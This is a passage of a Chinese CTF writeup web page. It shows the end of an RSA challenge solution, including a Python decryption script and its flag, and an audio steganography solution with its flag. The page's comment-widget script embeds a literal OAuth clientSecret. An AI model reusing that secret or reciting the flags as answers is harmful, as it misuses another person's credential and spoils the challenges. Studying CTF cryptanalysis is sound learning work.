class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>的两个根得到p2,q2，再通过欧拉函数对素数幂的表达式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo>(</mo><mi>n</mi><mn>2</mn><mo>)</mo><mo>=</mo><mo>(</mo><msubsup><mi>p</mi><mn>2</mn><mn>2</mn></msubsup><mo>−</mo><msub><mi>p</mi><mn>2</mn></msub><mo>)</mo><mo>(</mo><msubsup><mi>q</mi><mn>2</mn><mn>3</mn></msubsup><mo>−</mo><msubsup><mi>q</mi><mn>2</mn><mn>2</mn></msubsup><mo>)</mo></mrow><annotation encoding="application/x-tex">\varphi(n2)=(p_2^2-p_2)(q_2^3-q_2^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>求得，然后正常的RSA解密得flag2，最后将flag1和flag2合并即可</p>
+<pre><code class="language-python">import sympy
+from gmpy2 import *
+from Crypto.Util.number import *
+def solve(a,b,c):
+    delta=b*b-4*a*c
+    if delta&lt;0:
+        return (0,0)
+    delta=isqrt(delta)
+    if (-b+delta)%(2*a)!=0 or (-b-delta)%(2*a)!=0:
+        return (0,0)
+    return ((-b+delta)//(2*a),(-b-delta)//(2*a))
+
+n1=6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911
+a1=79679231796035037354449627487236220201878797729093909877127396750043503300636464774059752126148617367251988043645511172901030621825575172979048675217341753594180007984204016274224280609480494305040439035855109422239942522968468133274883986349646765947317076885918174299537297351936448296784166003890345486613
+a2=n1//a1
+for p0 in range(1,2000):
+    for q0 in range(1,2000):
+        term=(a1-a2+p0*q0)**2+4*p0*q0*a2
+        if iroot(term,2)[1]==True:
+            q=(iroot(term,2)[0]-p0*q0-a1+a2)//(2*p0)
+            if q!=0 and a2%q==0:
+                print(q)
+                print(p0)
+                print(q0)
+q=10619814058756849829412220719572078374866231482659600717706859832366243652256808143923755280218847619508647399114705626452464205932047979078592015381325551
+p=7502883888097212950622788817096216502912511795977786941568063923158816805073284550069689733527712330353018568842826730967449095687927404679782394052855569
+p0=828
+q0=726
+p1=p+p0
+q1=q+q0
+e=65537
+c1=6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826
+phi=(p-1)*(q-1)*(p1-1)*(q1-1)
+d1=invert(e,phi)
+flag1=long_to_bytes(pow(c1,d1,n1))
+SUM=274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778
+MUL=18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217
+p2,q2=solve(1,-SUM,MUL)
+PHI=(p2**2-p2)*(q2**3-q2**2)
+d2=invert(e,PHI)
+c2=25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647
+n2=40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593
+flag2=long_to_bytes(pow(c2,d2,n2))
+flag=flag1+flag2
+print(flag)
+</code></pre>
+<p>flag:</p>
+<pre><code>flag{Euler_funct1ons_1s_very_interst1ng}
+</code></pre>
+<h3 id="misc">Misc</h3>
+<h4 id="warmup音频隐写">[warmup]音频隐写</h4>
+<p>下载附件，丢入010分析，发现是WAV的文件头，于是把附件的后缀改为.wav</p>
+<figure data-type="image" tabindex="36"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/0223fcf0a854c.png" alt="1632918482723.png" loading="lazy"></figure>
+<p>修改完之后，得到一段音频文件，既然题目提示了音频隐写，那就用Audacity打开这段音频分析一下</p>
+<figure data-type="image" tabindex="37"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/fb547aa2283d1.png" alt="1632918531356.png" loading="lazy"></figure>
+<p>音频没发现有什么隐藏信息，于是 打开频谱图看看</p>
+<figure data-type="image" tabindex="38"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/3b50c2ee06950.png" alt="1632918660611.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="39"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/09b84b1d2dde2.png" alt="1632918728228.png" loading="lazy"></figure>
+<p>得到flag:</p>
+<pre><code>flag{f8fbb2c761821d3af23858f721cc140b}
+</code></pre>
+<h3 id="创新技术">创新技术</h3>
+<p>无</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#light1ng%E6%88%98%E9%98%9F">Light1ng战队</a><br>
+*
+<ul>
+<li><a href="#%E4%B8%80-%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF">一、战队信息</a></li>
+<li><a href="#%E4%BA%8C-%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5">二、解题情况</a>
+<ul>
+<li><a href="#%E4%B8%89-%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B">三、解题过程</a></li>
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#1ezphp">1.ezphp</a></li>
+</ul>
+</li>
+<li><a href="#ezphp">ezphp</a>
+<ul>
+<li><a href="#2looking-for-treasure">2.Looking for treasure</a></li>
+</ul>
+</li>
+<li><a href="#pwn">PWN</a>
+<ul>
+<li><a href="#1null">1.null</a></li>
+<li><a href="#2uaf">2.uaf</a></li>
+<li><a href="#3greentownnote">3.Greentownnote</a></li>
+</ul>
+</li>
+<li><a href="#re">RE</a>
+<ul>
+<li><a href="#1easy_re">1.easy_re</a></li>
+<li><a href="#2warmupbabyvxworks">2.[warmup]babyvxworks</a></li>
+<li><a href="#3%E6%8A%9B%E7%9F%B3%E6%9C%BA">3.抛石机</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a>
+<ul>
+<li><a href="#1rsa-1">1.RSA-1</a></li>
+<li><a href="#2warmup">2.Warmup</a></li>
+<li><a href="#3rsa_plus">3.RSA_plus</a>
+<ul>
+<li><a href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86">第一部分</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86">第二部分</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#warmup%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99">[warmup]音频隐写</a></li>
+</ul>
+</li>
+<li><a href="#%E5%88%9B%E6%96%B0%E6%8A%80%E6%9C%AF">创新技术</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/祥云杯_WP/">
+              <h3 class="post-title">
+                2021年第二届祥云杯Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
